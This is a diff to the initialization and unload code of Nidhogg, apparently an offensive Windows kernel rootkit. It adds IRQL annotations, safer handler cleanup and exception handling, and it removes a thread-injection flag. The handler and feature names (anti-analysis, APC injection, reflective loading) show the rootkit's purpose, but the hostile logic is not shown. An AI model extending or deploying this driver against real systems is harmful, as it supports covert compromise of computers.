@@ -2,6 +2,9 @@
 #include "Nidhogg.h"
 
 extern "C"
+_Function_class_(DRIVER_INITIALIZE)
+_IRQL_requires_same_
+_IRQL_requires_(PASSIVE_LEVEL)
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 #ifdef DRIVER_REFLECTIVELY_LOADED
 	UNREFERENCED_PARAMETER(DriverObject);
@@ -41,6 +44,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 * Returns:
 * @status		[NTSTATUS]		  -- Whether the driver is loaded successfuly or not.
 */
+_Function_class_(DRIVER_INITIALIZE)
+_IRQL_requires_same_
+_IRQL_requires_(PASSIVE_LEVEL)
 NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
 	NTSTATUS status = STATUS_SUCCESS;
@@ -148,10 +154,13 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 * Returns:
 * There is no return value.
 */
+_Function_class_(DRIVER_UNLOAD)
+_IRQL_requires_(PASSIVE_LEVEL)
+_IRQL_requires_same_
 void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	Print(DRIVER_PREFIX "Unloading...\n");
 
-	if (Features.RegistryFeatures) {
+	if (Features.RegistryFeatures && NidhoggRegistryHandler->regCookie.QuadPart != 0) {
 		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryHandler->regCookie);
 
 		if (!NT_SUCCESS(status)) {
@@ -188,6 +197,7 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 * Returns:
 * There is no return value.
 */
+_IRQL_requires_max_(APC_LEVEL)
 void ExecuteInitialOperations() {
 	ScriptManager* scriptManager = nullptr;
 	ScriptInformation scriptInfo{};
@@ -197,11 +207,12 @@ void ExecuteInitialOperations() {
 #pragma warning(push)
 #pragma warning(disable : 4702)
 	scriptInfo.ScriptSize = InitialOperationsSize;
-	MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
-	NTSTATUS status = scriptAllocator.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);
+	MemoryAllocator<PVOID> script(scriptInfo.ScriptSize);
+	NTSTATUS status = script.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);
 
 	if (!NT_SUCCESS(status))
 		return;
+	scriptInfo.Script = script.Get();
 
 	__try {
 		scriptManager = new ScriptManager();
@@ -233,14 +244,54 @@ void ExecuteInitialOperations() {
 * Returns:
 * There is no return value.
 */
+_IRQL_requires_same_
+_IRQL_requires_(PASSIVE_LEVEL)
 void ClearAll() {
-	delete NidhoggProcessHandler;
-	delete NidhoggThreadHandler;
-	delete NidhoggFileHandler;
-	delete NidhoggMemoryHandler;
-	delete NidhoggAntiAnalysisHandler;
-	delete NidhoggRegistryHandler;
-	delete NidhoggNetworkHandler;
+	IrqlGuard guard;
+	guard.SetExitIrql(PASSIVE_LEVEL);
+	if (NidhoggNetworkHandler) {
+		Print(DRIVER_PREFIX "Deleting NetworkHandler...\n");
+		delete NidhoggNetworkHandler;
+		NidhoggNetworkHandler = nullptr;
+	}
+	
+	if (NidhoggRegistryHandler) {
+		Print(DRIVER_PREFIX "Deleting RegistryHandler...\n");
+		delete NidhoggRegistryHandler;
+		NidhoggRegistryHandler = nullptr;
+	}
+	
+	if (NidhoggAntiAnalysisHandler) {
+		Print(DRIVER_PREFIX "Deleting AntiAnalysisHandler...\n");
+		delete NidhoggAntiAnalysisHandler;
+		NidhoggAntiAnalysisHandler = nullptr;
+	}
+	
+	if (NidhoggMemoryHandler) {
+		Print(DRIVER_PREFIX "Deleting MemoryHandler...\n");
+		delete NidhoggMemoryHandler;
+		NidhoggMemoryHandler = nullptr;
+	}
+	
+	if (NidhoggFileHandler) {
+		Print(DRIVER_PREFIX "Deleting FileHandler...\n");
+		delete NidhoggFileHandler;
+		NidhoggFileHandler = nullptr;
+	}
+	
+	if (NidhoggThreadHandler) {
+		Print(DRIVER_PREFIX "Deleting ThreadHandler...\n");
+		delete NidhoggThreadHandler;
+		NidhoggThreadHandler = nullptr;
+	}
+	
+	if (NidhoggProcessHandler) {
+		Print(DRIVER_PREFIX "Deleting ProcessHandler...\n");
+		delete NidhoggProcessHandler;
+		NidhoggProcessHandler = nullptr;
+	}
+	
+	Print(DRIVER_PREFIX "All handlers cleared successfully\n");
 }
 
 /*
@@ -253,7 +304,16 @@ void ClearAll() {
 * Returns:
 * There is no return value.
 */
+_IRQL_requires_max_(APC_LEVEL)
 bool InitializeFeatures() {
+	NidhoggProcessHandler = nullptr;
+	NidhoggThreadHandler = nullptr;
+	NidhoggFileHandler = nullptr;
+	NidhoggMemoryHandler = nullptr;
+	NidhoggAntiAnalysisHandler = nullptr;
+	NidhoggRegistryHandler = nullptr;
+	NidhoggNetworkHandler = nullptr;
+	
 	// Get windows version.
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
 	NTSTATUS result = RtlGetVersion(&osVersion);
@@ -270,40 +330,46 @@ bool InitializeFeatures() {
 	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);
 
 	// Initialize utils.
-	NidhoggProcessHandler = new ProcessHandler();
+	__try {
+		NidhoggProcessHandler = new ProcessHandler();
 
-	if (!NidhoggProcessHandler)
+		if (!NidhoggProcessHandler)
+			return false;
+
+		NidhoggThreadHandler = new ThreadHandler();
+
+		if (!NidhoggThreadHandler)
+			return false;
+
+		NidhoggFileHandler = new FileHandler();
+
+		if (!NidhoggFileHandler)
+			return false;
+
+		NidhoggMemoryHandler = new MemoryHandler();
+
+		if (!NidhoggMemoryHandler)
+			return false;
+
+		NidhoggAntiAnalysisHandler = new AntiAnalysisHandler();
+
+		if (!NidhoggAntiAnalysisHandler)
+			return false;
+
+		NidhoggRegistryHandler = new RegistryHandler();
+
+		if (!NidhoggRegistryHandler)
+			return false;
+
+		NidhoggNetworkHandler = new NetworkHandler();
+
+		if (!NidhoggNetworkHandler)
+			return false;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ClearAll();
 		return false;
-
-	NidhoggThreadHandler = new ThreadHandler();
-
-	if (!NidhoggThreadHandler)
-		return false;
-
-	NidhoggFileHandler = new FileHandler();
-
-	if (!NidhoggFileHandler)
-		return false;
-
-	NidhoggMemoryHandler = new MemoryHandler();
-
-	if (!NidhoggMemoryHandler)
-		return false;
-
-	NidhoggAntiAnalysisHandler = new AntiAnalysisHandler();
-
-	if (!NidhoggAntiAnalysisHandler)
-		return false;
-
-	NidhoggRegistryHandler = new RegistryHandler();
-
-	if (!NidhoggRegistryHandler)
-		return false;
-
-	NidhoggNetworkHandler = new NetworkHandler();
-
-	if (!NidhoggNetworkHandler)
-		return false;
+	}
 
 	// Initialize functions.
 	if (!reinterpret_cast<PULONG>(MmCopyVirtualMemory))
@@ -328,8 +394,5 @@ bool InitializeFeatures() {
 	if (!reinterpret_cast<PULONG>(KeInitializeApc) || !reinterpret_cast<PULONG>(KeInsertQueueApc) || 
 		!reinterpret_cast<PULONG>(KeTestAlertThread) || !reinterpret_cast<PULONG>(ZwQuerySystemInformation))
 		Features.ApcInjection = false;
-
-	if (NidhoggMemoryHandler->FoundNtCreateThreadEx())
-		Features.CreateThreadInjection = true;
 	return true;
 }
